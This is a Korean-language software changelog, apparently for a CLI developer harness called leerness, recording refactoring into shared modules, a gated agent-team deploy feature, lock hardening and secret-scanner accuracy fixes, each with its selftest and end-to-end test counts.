**🧩 (사용자 명시 허용) 큰 핸들러 분리의 선결 토대 — 공유 출력/시간 프리미티브 모듈 신설.**

### 배경
큰 핸들러를 별도 lib 모듈로 분리하려면, harness 인라인이던 `log/ok/warn/fail`(출력) + `today/now`(시간) 프리미티브를 **공유 모듈**로 빼야 함(다른 모듈이 import 가능해야 함). 이 토대 없이는 핸들러 추출 시 매번 deps 주입 필요. 첫 단계로 자기완결적 프리미티브 6종을 `lib/io.js` 로 분리.

### 구현
1. **`lib/io.js`**(신설): `log/ok/warn/fail/today/now` 단일출처. fail 은 stdout + `process.exitCode=1`(UR-0045 정책 유지).
2. harness 인라인 정의 제거 → `const { log, ok, warn, fail, today, now } = require('../lib/io')`. **호출부 무변경**(이름 동일, ~1000+ 호출 그대로).

### 검증 (회귀 0)
- **selftest 127→128 PASS** (io exports 6종 함수 + reference equality + today/now 포맷 + fail→exitCode 1 행위 + 인라인 정의 제거 확인).
- **E2E 326→327 PASS** (io exports + init `ok()` 출력 유지 + verify 누락 `fail()`→exit 1 유지 — consumer 동작 보존).
- 실측: init ✓ 6줄, verify 누락 exit 1, handoff(now/today) exit 0.

### 향후: lib/io.js 에 fs 프리미티브(read/write/exists 등) 추가 → 핸들러를 lib 모듈로 점진 분리 가능.

## 1.9.381 — 2026-06-06 — UR-0025: KEYWORD_STOPWORDS 단일출처 (키워드 stopwords 2중 중복 제거)

**🧩 handoff 자동회수 / lessons 키워드추출이 각자 보유하던 동일 stopwords Set 을 catalogs 단일출처로 DRY.**

### 배경
키워드 추출 stopwords(한국어 24 + 영어 5)가 harness.js 두 곳(handoff 자동회수 8332, lessons 키워드추출 14647)에 **2중 복제**. 한 곳만 바뀌면 두 키워드 추출 동작이 갈라짐.

### 구현
1. **`KEYWORD_STOPWORDS`** → lib/catalogs.js (Set, 29개 단일출처).
2. harness 2개 인라인 `new Set([...])` → `const stopwords = KEYWORD_STOPWORDS;` (node 스크립트 정규식 결정적 교체, 내용 동일).

### 검증 (회귀 0)
- **selftest 126→127 PASS** (catalog Set 29개 + '작업'/'task' 포함 + reference equality + 2 사이트 const + 인라인 Set 0).
- **E2E 325→326 PASS** (catalog Set + 키워드 필터 동작(stopwords 제거 후 고유 키워드만) + handoff consumer 무크래시).
- 실측: KEYWORD_STOPWORDS 29개, 필터 정상, handoff exit 0.

## 1.9.380 — 2026-06-06 — UR-0025: REQUIRED_WORKSPACE_FILES 단일출처 (필수목록 3중 중복 제거)

**🧩 verify / migrate audit / migrate apply 가 각자 보유하던 동일 9-파일 필수목록을 catalogs 단일출처로 DRY.**

### 배경
필수 워크스페이스 파일 목록(9종)이 verify(6786)·migrateAuditCmd(6807)·migrateApplyCmd(6839) 에 **3중 복제**돼 있었음. 한 곳만 바뀌면 불일치 위험.

### 구현
1. **`REQUIRED_WORKSPACE_FILES`** → lib/catalogs.js (단일출처).
2. harness 3개 인라인 배열 → `const required = REQUIRED_WORKSPACE_FILES;` 로 교체(node 스크립트 결정적 교체, 내용 동일 확인).
3. 별도 4-파일 경량 체크(7511)는 다른 용도라 보존(중복 아님).

### 검증 (회귀 0)
- **selftest 125→126 PASS** (catalog 9파일 + reference equality + 3 사이트 const 사용).
- **E2E 324→325 PASS** (verify: init 통과 / AGENTS.md 누락 시 exit 1 + missing 메시지).
- 실측: verify init통과·누락실패, migrate audit missing-file 감지 정상.

## 1.9.379 — 2026-06-06 — UR-0025 심화: pulse 핸들러 렌더 코어 분리 (수집→렌더 패턴 착수)

**🧩 큰 핸들러 모듈화 착수 — display 핸들러의 "수집(I/O) → 렌더(순수)" 분리 패턴을 pulse 에 적용.**

### 배경
사용자 선택(큰 핸들러 모듈화/UR-0025 심화). 대형 I/O-결합 핸들러를 안전하게 분해하기 위해, **순수한 렌더/포맷 코어**를 lib/pure-utils 로 분리하고 핸들러는 gather(I/O)+순수 렌더 구조로 정리하는 패턴을 확립. 첫 대상: pulse(집계 display 핸들러).

### 구현
1. **`_memorySurface(counts)`**(pure-utils): T/D/R/P/L 카운트 → 문자열. pulse + memory-status 단일출처(중복 포맷 제거).
2. **`_renderPulseLine(data)`**(pure-utils): gather 된 data → 한 줄 요약 문자열(마일스톤/비정상종료 조건부 포함).
3. **pulseCmd**: 인라인 memory-surface 조합 + 한 줄 조합을 순수 코어 호출로 교체(gather 부분만 I/O 유지).

### 검증 (회귀 0)
- **selftest 124→125 PASS** (행위: `_memorySurface` 카운트→문자열, `_renderPulseLine` 기본/마일스톤/abnormal 분기 + pulse 와이어).
- **E2E 323→324 PASS** (행위: 빌더 동작 + pulse CLI 한 줄 출력 정규식 유지).
- 실측: pulse human/JSON 출력 동일.

## 1.9.378 — 2026-06-06 — UR-0073: 에이전트 팀 MCP 노출 (read-only list/preview)

**🧩 신규 team 서브시스템을 MCP 로 외부 AI 에 노출 — 에이전트 팀 비전을 외부 에이전트가 직접 활용.**

### 배경
leerness 는 MCP-first(80+ 도구)이나 신규 team 서브시스템(UR-0073)이 MCP 미노출이었음. 외부 AI 에이전트가 팀을 조회/미리보기할 수 있어야 비전("에이전트가 팀 관리/실행")이 완성. **읽기 전용만 노출**(deploy 는 CLI 게이트 유지 — MCP 로 배포 트리거 방지).

### 구현
1. **`leerness_team_list`**(read-only): 정의된 팀 목록 JSON.
2. **`leerness_team_preview`**(read-only, `id` required, `task?`): 팀 실행 계획 dry-run 미리보기 JSON(실행 없음).
3. harness MCP dispatch 2 case(`team list/preview --json` 매핑). MCP 도구 83→85(`_mcpToolCount` 자동 반영).

### 검증 (회귀 0)
- **selftest 123→124 PASS** (MCP 정의 read-only + required id + dispatch 와이어). **E2E 322→323 PASS** (정의 + 매핑 CLI 동작).
- 실측: mcp-tools 85개, team_list/preview read-only, 매핑 CLI 정상.

## 1.9.377 — 2026-06-06 — UR-0025 모듈화: workspace reference guide 빌더 분리

**🧩 워크스페이스 레퍼런스 가이드 빌더(~57줄)를 lib/pure-utils 로 분리.**

### 구현
1. **`_renderWorkspaceReferenceGuide(dirName, version, generatedAt)`**(pure-utils): 디렉토리 구조/자주 묻는 위치/마이그레이션 안내 가이드 빌더. version·timestamp 주입(순수).
2. **harness `_buildWorkspaceReferenceGuide(root, dirName)`**: 얇은 래퍼(`_renderWorkspaceReferenceGuide(dirName, VERSION, new Date().toISOString())`).
3. 전사 위험 회피: node 스크립트로 결정적 교체 + 출력 동일성(핵심 마커) 검증.

### 검증 (회귀 0)
- **selftest 122→123 PASS** (행위: 빌더가 dirName/version 반영 + 핵심 섹션 포함 + 래퍼 얇음 + 모듈 reference equality).
- **E2E 321→322 PASS** (행위: lib/pure-utils 직접 호출로 가이드 빌더 출력 검증).

## 1.9.376 — 2026-06-06 — UR-0073 Phase D: team deploy 2중 게이트 (에이전트 팀 umbrella 완결) 🎉

**🧩 정의된 팀의 사용자 설정 배포 명령을 안전 게이트로 실행 — `leerness team deploy`. UR-0073 A~D 완결.**

### 배경
UR-0073 로드맵의 마지막·최고위험 단계(실제 외부 배포). 방향 설계 안전 원칙(opt-in/dry-run 기본/명시 승인) 엄격 적용. **Firebase/블로그를 하드코딩하지 않고**(offline-first/0-deps 유지) 사용자가 `deployCommand` 를 설정하면 leerness 가 게이트와 함께 오케스트레이션.

### 구현
1. **`team add --deploy "<명령>"`**: 팀에 사용자 설정 배포 명령(예: `firebase deploy --only hosting`, `npm run deploy`) 저장.
2. **`team deploy <id> [--yes]`** + **`_teamDeployGate`**(순수, 4-mode): 
   - **dry-run**(기본, --yes 없음): 명령 표시만, 실행 X.
   - **gated**(--yes 만, env 없음): **거부** — `LEERNESS_TEAM_DEPLOY=1` 필요.
   - **execute**(--yes + `LEERNESS_TEAM_DEPLOY=1`): shell-guard advisory 점검 후 팀 root 에서 spawn.
   - no-command: deployCommand 미설정 안내.
3. **2중 게이트 안전**: 실행은 명시 플래그(`--yes`) AND 명시 env opt-in(`LEERNESS_TEAM_DEPLOY=1`) 동시 충족 시에만. (전역 지침 "deploy 신중" 준수.)
4. _renderTeamsMd/show + commands/help 에 deploy 반영.

### 검증 (회귀 0)
- **selftest 121→122 PASS** (행위: `_teamDeployGate` 4-mode no-command/dry-run/gated/execute).
- **E2E 320→321 PASS** (행위: dry-run 실행 X marker 없음 · --yes만 거부 marker 없음 · --yes+env 실행 marker 생성).
- 실측: 3개 게이트 경로 정확 + 배포 명령 spawn 검증.

### 🎉 UR-0073 에이전트 팀 umbrella 완결
A(정의 레지스트리)·B(preview dry-run)·C(스케줄 알림)·**D(배포 2중 게이트)** 전 단계 완료. 모두 opt-in/dry-run/게이트 안전 위에 구축.

## 1.9.375 — 2026-06-06 — UR-0084: 동시성 락 하드닝 (e2e flake 제거 + lost-update 창 축소)

**🛠 고부하 시 간헐 flake 한 락 테스트 + `_withLock` fail-open 창 하드닝.**

### 배경
1.9.374 e2e(561s 고부하)에서 "lost-update 락" 테스트가 1회 flake(UR-0084). 근원: `_withLock` 이 `maxWaitMs`(5s) 초과 시 **락 없이 진행**(fail-open) → 극단 경합 시 lost-update 창. + e2e 폴 60s 가 CPU 포화 시 6 병렬 spawn 완료에 빠듯.

### 구현
1. **`_withLock` maxWaitMs 5s→10s**: fail-open(락 없이 쓰기) 전 인내 2배 — 고부하 경합에서 lost-update 창 축소(fail-open 정책은 유지, 무한 차단 방지).
2. **e2e lost-update 폴 60s→120s**: CPU 포화 헤드룸 2배(격리 실측 0.4s 라 대폭 여유).
3. **`_withLock` 행위 selftest 추가**: 실제 락 획득(lock 파일 존재)→재진입(중첩 호출 42)→해제(cleanup) + maxWaitMs 하드닝 확인.

### 검증 (회귀 0)
- **selftest 120→121 PASS** (신규: _withLock 실호출 행위). **E2E 320/320 PASS**(락 테스트 강건화).
- 실측: _withLock 획득/재진입/해제 정상, 락 파일 정리.

## 1.9.374 — 2026-06-06 — UR-0074: release cadence 진단 (외부리뷰 케이던스 가시화)

**🧩 외부 리뷰가 반복 지적한 "릴리스 케이던스 과다"를 측정·가시화 — `leerness release cadence`.**

### 배경
3개 모델 + GPT-5.5 외부 리뷰 모두 300+ 버전의 높은 릴리스 빈도를 신뢰 저하 요인으로 지적(UR-0074). 케이던스를 **측정 가능하게** 만들어 자기 인지 + batched-minor 전환 근거를 제공.

### 구현
1. **`_cadenceAssessment(perDay, total, daysActive)`**(순수): releases/day → 수준(very-high ≥5 / high ≥2 / moderate ≥0.5 / healthy) + 권장(batched minor·stable 채널 등).
2. **`leerness release cadence [path] [--json]`**: git tag(`_computeRoundHistory` 재사용)로 누적/활동일/빈도 산출 → 평가 출력. 읽기 전용.
3. commands(release) + help 등재.

### 검증 (회귀 0)
- **selftest 119→120 PASS** (행위: 임계값 4구간 + 권장 비어있지 않음).
- **E2E 319→320 PASS** (행위: `release cadence --json` level∈집합 + releasesPerDay number + recommendation string).
- 실측: 본 저장소 330 릴리스 / 28일 = **11.79/day → very-high**(외부리뷰 우려를 그대로 정량 확인) → batched minor 권장.

## 1.9.373 — 2026-06-06 — UR-0073 Phase C: handoff 팀 스케줄 알림 (opt-out · 실행 트리거 아님)

**🧩 정의된 비-manual 팀을 세션 시작(handoff)에서 미리보기 안내 — 스케줄 인지.** (UR-0073 Phase C)

### 구현
1. **`_teamHandoffReminders(teams)`**(순수): `schedule !== 'manual'` 이고 `status==='active'` 인 팀만 → `🤝 <id> (<schedule>) · N명 — 미리보기: leerness team preview <id>` 라인.
2. **handoff 통합**: 정의된 팀이 있으면 `## 🤝 에이전트 팀 스케줄` 섹션 노출. **opt-out**(`--no-team-reminders` / `LEERNESS_NO_TEAM_REMINDERS=1` / `--compact`/`--quiet`).
3. **안전**: 알림은 **미리보기 안내만** — 실행/dispatch/배포 트리거 아님. manual·paused 팀 제외.

### 검증 (회귀 0)
- **selftest 118→119 PASS** (행위: every-session/active 만 알림, manual·paused 제외, `team preview` 링크 포함, 모듈 reference equality).
- **E2E 318→319 PASS** (행위: handoff 가 every-session 팀 노출 + manual 제외 + `LEERNESS_NO_TEAM_REMINDERS=1` opt-out).
- 실측: handoff 에 rev(every-session) 노출, man(manual) 미표시, opt-out 동작.

### UR-0073 로드맵: A(정의)·B(preview)·**C(스케줄 알림)** 완료. D(배포 통합)는 향후 권한 게이트.

## 1.9.372 — 2026-06-06 — UR-0073 Phase B: team preview — dry-run 실행 계획 미리보기

**🧩 정의된 팀의 작업을 실제 실행 없이 미리보기 — `leerness team preview`.** (UR-0073 Phase B, 안전 게이트: dry-run 전용)

### 구현
1. **`leerness team preview <id> [--task "..."]`** + `_composeTeamPlan(team, task)`(순수): 팀의 members × personas × task 로 **멤버별 dispatch 명령 문자열**을 생성. `--task` 미지정 시 팀 purpose 를 기본 작업으로.
2. **dry-run 전용 안전**: 실제 spawn/dispatch/배포 **없음**, 파일 변경 0. 출력은 검토용 제안 명령(`leerness agents dispatch "..." --to <member>`)만. `--json` 은 `{ dryRun:true, task, steps:[{member,personas,dispatchPrompt,suggestedCommand}] }`.
3. commands/help 에 preview 반영.

### 검증 (회귀 0)
- **selftest 117→118 PASS** (행위: `_composeTeamPlan` 멤버별 step/persona 주입/purpose 기본값/빈 members + 모듈 reference equality).
- **E2E 317→318 PASS** (행위: team add→preview `--json`(dryRun true, steps 2, dispatch 명령) + preview 후 teams.json mtime 불변=파일변경 0).
- 실측: preview 가 dispatch 계획만 출력, 실행/변경 없음.

### UR-0073 로드맵: Phase A(정의) → **B(preview dry-run)** 완료. C(스케줄 트리거)/D(배포 통합)는 향후 opt-in 게이트.

## 1.9.371 — 2026-06-06 — UR-0073 Phase A: 에이전트 팀 정의 레지스트리 (opt-in · 정의 전용)

**🧩 페르소나 기반 에이전트 팀 비전 착수 — `leerness team` 정의 레지스트리.** (UR-0073 Phase A, 안정화 완료 후 opt-in 신규 비전)

### 배경
사용자 비전(UR-0073): 페르소나 기반 영속 에이전트 팀(리뷰/배포/블로그 팀)이 세션/주기적으로 자동 작업. 방향 설계대로 **코어 안정화 완료 후 opt-in 으로 착수**. Phase A 는 **정의 레지스트리(persistence layer)** 만 — 자동 실행은 향후 단계로 게이트.

### 구현
1. **`leerness team list|add|show|remove <id>`** + 옵션(`--name --purpose --personas a,b --members claude,codex --schedule manual|every-session|daily|weekly`).
2. **canonical JSON 패턴**: `teams.json`(주) + `teams.md`(projection, `_renderTeamsMd` 순수 렌더러 → pure-utils). `_loadTeams`/`_saveTeams` I/O.
3. **안전**: 정의 전용 — **자동 실행 없음**(메타데이터만). id 정규화(영숫자/._-, traversal sanitize). dedup. schedule 화이트리스트.
4. **표면 정합(CV-7 규율)**: commands ops 카테고리 + help 등재.

### 검증 (회귀 0)
- **selftest 116→117 PASS** (행위: `_renderTeamsMd` 출력 + `_saveTeams`/`_loadTeams` round-trip + JSON/MD 생성).
- **E2E 316→317 PASS** (행위: team add→list(--json count/personas/schedule)→canonical JSON+MD 생성→remove→count 0).
- 실측: add/list/show/remove + teams.json/teams.md 생성 + id sanitize.

### UR-0073 다단계 — Phase A(정의 레지스트리) 완료, 실행/스케줄/배포 단계는 향후 opt-in (open 유지).

## 1.9.370 — 2026-06-06 — UR-0025 모듈화: archive/skill-catalog 순수 파서 분리

**🧩 순수 파서 2종을 lib/pure-utils 로 분리 — 인라인 ~65줄 제거.**

### 구현
1. **`_parseArchiveBlocks(text)`**(pure-utils): memory archive 블록 파서 — `## 제거 DATE (target: "...")` → `{date,target,originalHeader}[]`.
2. **`_parseSkillCatalog(body, sourceUrl)`**(pure-utils): skill 카탈로그 파서 — JSON/RSS·Atom/markdown 링크/llms.txt 4형식 → `{name,url,description,format}[]`.
3. harness 인라인 정의(~65줄) 제거 → import 대체. consumer(`memory archive list`/`skill discover`) 무변경.

### 검증 (회귀 0)
- **selftest 115→116 PASS** (행위: archive 블록 파싱 + markdown/json skill 파싱 + 모듈 reference equality).
- **E2E 315→316 PASS** (행위: lib/pure-utils 직접 호출로 두 파서 출력 검증).
- 실측: `memory archive list` consumer 무크래시.

## 1.9.369 — 2026-06-06 — UR-0025 모듈화: _parseSkillsValue + MINIMAL_SKIP_KEYS 분리

**🧩 install 설정 로직/데이터 모듈화 — --skills 파서 순수화(catalog 주입) + --minimal 제외목록 catalogs 응집.**

### 구현
1. **`_parseSkillsValue(v, catalog)`**(pure-utils): `--skills` 값 파싱(all/recommended/csv) + catalog 필터. skillCatalog 를 인자 주입해 harness 모듈 상태와 비결합. harness `parseSkillsValue(v)` = 얇은 래퍼.
2. **`MINIMAL_SKIP_KEYS`**(catalogs): `init --minimal` 제외 키목록(에디터통합/가이드/템플릿 등 비핵심). harness import.

### 검증 (회귀 0)
- **selftest 114→115 PASS** (행위: `_parseSkillsValue('all',cat)`/`'recommended'`/`'office,bar'`→catalog 필터 + 모듈 reference equality + `MINIMAL_SKIP_KEYS` 보유).
- **E2E 314→315 PASS** (행위: `init --minimal` → architecture.md 제외 + plan.md 유지 · `init --skills recommended` → office 스킬 설치).
- 실측: 위 시나리오 확인.

## 1.9.368 — 2026-06-06 — UR-0025 모듈화: README/managed 머지 + MERGE_OVERWRITE_FILES 분리

**🧩 마이그레이션 머지 안전 핵심을 모듈화 — README/관리파일 머지 순수 코어 → pure-utils, overwrite 파일목록 → catalogs.**

### 구현
1. **`_mergeReadmeSection(existing, block, START, END)`**(pure-utils): README 관리섹션 마커 사이 교체/append. 마커는 인자 주입(harness 상수 비결합).
2. **`_managedMerge(file, next, previous, archiveRel, overwriteSet)`**(pure-utils): 관리 파일 마이그레이션 머지 — 이전 내용을 `<!-- leerness:migration-preserved -->` 블록으로 보존(데이터/인덱스 파일은 overwrite). archiveRel(사전계산)+overwriteSet 주입 → path/process/상수 비결합(순수).
3. **`MERGE_OVERWRITE_FILES`** → lib/catalogs (데이터 응집).
4. **harness**: `mergeReadmeSection`/`managedMerge` 은 마커/archiveRel/set 만 주입하는 얇은 래퍼.

### 검증 (회귀 0)
- **selftest 113→114 PASS** (행위: `_mergeReadmeSection('','BLOCK',..)`==='# Project\n\nBLOCK' / `_managedMerge` preserved 블록 생성 / overwrite-set→NEW만 / 동일내용→NEW / 모듈 reference equality).
- **E2E 313→314 PASS** (행위: init → AGENTS.md 사용자 편집 → migrate → migration-preserved 블록에 편집 보존).
- 실측: AGENTS.md 편집 후 migrate → marker + preserved 블록 보존. init/migrate/check smoke 정상.

## 1.9.367 — 2026-06-06 — UR-0025 모듈화: env/line 머지 순수 코어 분리

**🧩 안정화 마일스톤 이후 모듈화(UR-0025) 재개 — `.env`/라인 머지 순수 코어를 lib/pure-utils 로 분리, harness 는 얇은 I/O 래퍼.**

### 배경
외부 리뷰가 지목한 코드 품질(5.8) 개선 방향 = 21k줄 단일 harness.js 모듈화. 비파괴 추출 패턴(데이터→catalogs, 순수 로직→pure-utils, harness 얇은 래퍼) 지속.

### 구현
1. **`_mergeLines(currentText, lines)`**(pure-utils): 기존 텍스트에 없는 라인만 append (substring 중복 방지).
2. **`_mergeEnvLines(currentText, lines)`**(pure-utils): `.env` key-aware 머지 — 기존 KEY 값 보존(덮어쓰기 X), 신규 KEY/주석만 append. 사용자가 편집한 토큰을 절대 덮어쓰지 않는 핵심 로직.
3. **harness `mergeLinesFile`/`mergeEnvFile`**: 순수 코어 + `read`/`writeUtf8` 만 남긴 얇은 I/O 래퍼.

### 검증 (회귀 0)
- **selftest 112→113 PASS** (행위: `_mergeLines('a\n',['a','b'])==='a\nb\n'` / `_mergeEnvLines('FOO=keep\n',['FOO=new'])==='FOO=keep\n'`(보존) / 신규 KEY append + 모듈 reference equality).
- **E2E 312→313 PASS** (행위: init → `.env` 토큰 편집 → migrate → 사용자 값 key-aware 보존).
- 실측: init→토큰편집→migrate→`LEERNESS_NPM_TOKEN` 사용자 값 보존.

## 1.9.366 — 2026-06-06 — 안정화⑥(완결) 외부리뷰 CV-5: selftest 행위화 + 외부리뷰 7 finding 전량 해소 🎉

**🛠 외부 멀티모델 리뷰 안정화 시리즈 최종 6탄 — selftest 동어반복 source-grep 핵심 케이스를 행위 검증으로 전환. CV-1~7 + 4번째 외부평가 전량 해소로 안정화 마일스톤.**

### 배경 — 외부 리뷰 CV-5 (3개 모델 합의)
selftest ~13/106 케이스가 소스 문자열 grep(`src.includes`)이라 동작이 깨져도 통과(EINVAL 버그가 selftest 106/106 통과한 근본 원인). 권고: 구조 무결성(selftest) vs 행위(e2e) 분리 + 핵심 source-grep 을 행위 검증으로.

### 구현
1. **핵심 동어반복 케이스 행위 전환**:
   - `writeUtf8`: 소스 grep → **실제 호출**(중첩 dir 에 한글 UTF-8 쓰기 → round-trip 내용 일치 + `.tmp-` 잔존 0 검증).
   - `exit code(fail)`: 소스 grep → **실제 호출**(stdout 억제 + exitCode save/restore 로 `fail()` → `process.exitCode===1` 단언).
2. **구조 vs 행위 분리 원칙 확립**: 구조 케이스(dispatch 와이어/등록 존재 — 빠른 sync)는 selftest 유지, 행위 케이스(로직 출력 정확성)는 함수 직접 호출. **안정화 시리즈(1.9.360~366) 신규 케이스는 전부 행위 기반**(argv 주입/prune/placeholder/secret-like/quiet 등).
3. **selftest 무결성 e2e 가드**: 설치 패키지 관점 `selftest --json` 전부 통과(pass===total, fail===0) 단언.

### 검증 (회귀 0)
- **selftest 112/112 PASS**(2건 행위 전환, 카운트 유지). **E2E 311→312 PASS**(selftest --json 무결성 가드).

### 🎉 외부 리뷰 안정화 마일스톤
3개 모델 클린룸 리뷰(1.9.359) 교차검증 7 finding + 4번째 외부평가(web) 9.3 **전량 해소**:
| finding | 버전 |
|---|---|
| CV-2 EINVAL | 1.9.360 |
| CV-1 --path · CV-3 audit | 1.9.361 |
| CV-4 archive retention | 1.9.362 |
| CV-7 commands/help drift | 1.9.363 |
| 4th평가 9.3 auto-update 비침투 | 1.9.364 |
| CV-6 스캐너 FP/FN | 1.9.365 |
| CV-5 selftest 행위화 | 1.9.366 |

다음: 모듈화(UR-0025) → 에이전트 팀(UR-0073) → 릴리스 케이던스(UR-0074).

## 1.9.365 — 2026-06-06 — 안정화⑤ 외부리뷰 CV-6: 시크릿 스캐너 FP/FN 정밀도 (UR-0081)

**🛠 외부 멀티모델 리뷰 안정화 시리즈 5탄 — 시크릿 스캐너 오탐(placeholder/자기 .env) 억제 + 미탐(unquoted) 보강.**

### 배경 — 외부 리뷰 CV-6 (Opus+Sonnet)
- **FP**: `secret: "change-me"` 같은 placeholder 경보(Opus), 사용자가 토큰 채운 gitignored `.env` 경보(Sonnet, 설계 모순 — .env 는 gitignored 안전 보관소).
- **FN**: 따옴표 없는 `KEY=secret123` 미탐(Opus, 패턴이 따옴표 강제).
- provider 19종 정탐 6/6 양호(FP 없음).

### 구현
1. **placeholder FP 억제** — `_isPlaceholderSecret(value)`(pure): change-me/your-*/<...>/example/${...} 등 명백한 예시값은 시크릿 아님. assignment 패턴(valueGroup)의 **값에만** 적용(provider 형식 키엔 미적용 → FN 방지).
2. **unquoted FN 보강** — 신규 패턴 `KEY=value`(따옴표 없음) + `_looksSecretLike`(숫자포함 8+/24+ 만 후보 → camelCase 코드 식별자 오탐 억제). charset 이 `.` 제외 → `process.env.X` 등 var-ref 자동 제외.
3. **gitignored 강등** — `_isLikelyGitignored`(간이 .gitignore 매칭): gitignored 파일(.env 계열)의 발견은 **info 로 강등**(커밋 제외 = 설계상 안전), 커밋되는 파일 발견만 실패. `.env` 미-gitignore 시엔 정상 실패.
4. SECRET_PATTERNS 19→20.

### 검증 (회귀 0)
- **selftest 111→112 PASS** (행위: `_isPlaceholderSecret`/`_looksSecretLike` 직접 호출 단언). **E2E 310→311 PASS** (행위: placeholder no-fail / unquoted 탐지 / gitignored info 강등 3시나리오).
- 실측: `{secret:"change-me"}` no-fail · `password=hunter2realsecret` 탐지 · gitignored `.env`(토큰) exit 0 + info, 미-gitignore 시 fail.

## 1.9.364 — 2026-06-06 — 4번째 외부평가 반영: auto-update hook 비침투화 (UR-0083)

**🛠 4번째 외부평가(web, 1.9.361 대상) 9.3 반영 — SessionStart 자동업데이트 hook 매세션 노이즈 제거.**

### 배경
4번째 외부평가가 "Claude 세션 시작마다 `leerness update --check` 가 실행돼 부담"을 지적(9.3). Codex CV-2 후속 권고(hook 비침투화)와 일치. `--no-auto-update`(opt-out)는 이미 존재하나, 기본 ON 상태의 hook 이 매 세션 출력하는 점이 문제.

### 구현
1. **`update --check --quiet` 모드**(신규): up-to-date 시 **완전 무음**, 업데이트 가능 시에만 1줄 통지. 헤더/네트워크 로그 전부 억제.
2. **SessionStart hook 명령 → `leerness update --check --quiet`**: 새 설치는 quiet hook. 
3. **기존 비-quiet hook 자동 업그레이드**: autoUpdateInstall 재실행(migrate 포함) 시 기존 `leerness update --check`(비-quiet)를 quiet 버전으로 교체 → 기존 사용자도 노이즈 제거.
4. **opt-out 가시화**: hook 설치 안내에 "최신이면 무음" 명시 + `--no-auto-update` 끄기 안내 유지.

### 검증 (회귀 0)
- **selftest 110→111 PASS** (quiet 모드 + hook --quiet + 업그레이드 로직 가드). **E2E 309→310 PASS** (행위: up-to-date `update --check --quiet` 무음 + hook 명령 --quiet 확인).
- 실측: up-to-date 프로젝트 `update --check --quiet` → 출력 0 chars. 기존 비-quiet hook → 재설치 시 `--quiet` 로 업그레이드.

## 1.9.363 — 2026-06-06 — 안정화④ 외부리뷰 CV-7: commands/help 표면 drift 해소 (UR-0082)

**🛠 외부 멀티모델 리뷰 안정화 시리즈 4탄 — `--help`/`commands` 에서 누락됐던 명령군 전수 등재.**

### 배경 — 외부 리뷰 CV-7 (Codex+Opus)
`install-safety`(1.9.359) + 8개 명령군(feature/creds/incident/webhook/deploy/runs/permissions/whats-new) + 이번 세션 신규 `migrate audit|apply|plan` 이 `--help`/`commands` 에 노출 안 됨(문서-동작 drift). phantom(문서O구현X) 명령은 0(양호).

### 구현
1. **`commands` 카탈로그 확장** (60→77 명령): `config` 에 migrate 서브커맨드+가이드, doctor/selftest/install-safety/env/shell-guard/path-setup 추가. 신규 **`ops` 카테고리**(feature/permissions/capabilities/creds/incident/webhook/deploy/runs/whats-new). 카테고리 9→10, 푸터 카테고리 수 동적화.
2. **`help()` 보강**: 누락 명령군 블록 추가 + "`commands` 로 전수 확인" 안내.
3. **표면 drift 가드**: selftest(commandsCmd+help 본문에 누락 명령군 존재 단언) + e2e(`commands --json` 전수 등재 + total>=70) — 재발 차단.

### 검증 (회귀 0)
- **selftest 109→110 PASS** · **E2E 308→309 PASS**.
- 실측: `commands --json` total 77 / 10 카테고리 / 누락 명령 10종 전부 등재. `--help` 에도 반영.

## 1.9.362 — 2026-06-06 — 안정화③ 외부리뷰 CV-4: archive retention (무한 누적 차단, UR-0079)

**🛠 외부 멀티모델 리뷰 안정화 시리즈 3탄 — init/migrate 재실행 시 archive 무한 누적 차단.**

### 배경 — 외부 리뷰 CV-4 (Opus P1 / Sonnet P3)
init/migrate 가 변경 유무와 무관하게 매 실행마다 전체 archive 스냅샷을 생성하나 retention 이 없어 무한 누적(Opus: 5회 재실행 → `.harness` 1.7M 중 1.5M 이 중복 archive). createBackup(709)이 prune 없이 copy 만.

### 구현
1. **`_pruneArchives(root, keep)`**(신규): `.harness/archive/leerness-*` 디렉토리를 **mtime 기준** 정렬해 최신 `keep` 개만 유지, 오래된 스냅샷 prune. (이름의 버전 문자열은 zero-pad 안 돼 사전순 부정확 → mtime 사용.)
2. **createBackup 통합**: 새 스냅샷 기록 후 `_pruneArchives(root, keep)` 호출. `keep` = `--keep N`(기본 10). init/migrate/update 전부 자동 bounded.

### 검증 (회귀 0)
- **selftest 108→109 PASS** (행위: 임시 archive 5개 생성 → `_pruneArchives(root,2)` → pruned 3 / 남은 2 단언). **E2E 307→308 PASS** (행위: `init --keep 2` + `migrate --keep 2` x3 = 4 스냅샷 → archive 2개 상한).
- 실측: `--keep 2` 로 init+migrate x3 후 archive 정확히 2개.

## 1.9.361 — 2026-06-06 — 안정화② 외부리뷰 CV-1 --path 라우팅 통일 + CV-3 audit 가드 (UR-0076/0078)

**🛠 외부 멀티모델 리뷰 안정화 시리즈 2탄 — 3개 모델 합의 #1 finding(--path 불일치) + audit 오판 수정.**

### 배경
- **CV-1 (P1, 3/3 모델 + 자체검증)**: 다수 명령이 positional / `--path=값` 을 무시하고 cwd 로 silent fallback. 특히 `session close --path X` 가 cwd 에 써서 **wrong-root 쓰기**(데이터 정합 위험).
- **CV-3 (P1, 2/3 + 자체재현)**: `audit` 가 미초기화/존재하지 않는 경로를 `healthy:true` 로 오판(verify 는 올바르게 exit 1).

### 구현
1. **`arg()` `--path=값` 등호형 지원** (이전엔 `--path 값` 공백형만 — Opus 지적). 전 `arg('--path',...)` 명령에 일괄 적용.
2. **공통 `_resolveRoot(positional)` 헬퍼**: `--path`(=값 포함) > 유효 positional > cwd. silent cwd fallback 방지.
3. **적용**: `session close`(wrong-root 쓰기 해소)·`lazy detect`(--path 무시 해소)·`context`·`pulse`·`milestones`·`round-history`(positional 무시 해소). (`health`/`whats-new`/`drift`/`usage` 등 `args[N] || arg('--path',cwd)` 형은 이미 양쪽 처리 → arg() 보강만으로 등호형까지 정상.)
4. **CV-3**: `audit` 시작부에 root/.harness/AGENTS.md 존재 가드 → 미초기화는 failure 승격(healthy=false, exit 1) — verify 와 일관.

### 검증 (회귀 0)
- **selftest 107→108 PASS** (CV-1 행위 검증: argv 주입으로 `arg('--path=값')` + `_resolveRoot` 우선순위 4종 단언). **E2E 305→307 PASS** (CV-1 행위: cwd=B 에서 `session close --path A` → A 의 handoff 재생성·`context --path=` 등호형 정타깃 / CV-3: 미초기화 audit healthy=false).
- 실측: `context --path A`/`--path=A`/positional A 모두 A 읽음(cwd 아님). audit 미초기화 → healthy:false failures:1.

### 잔여 (후속 라운드)
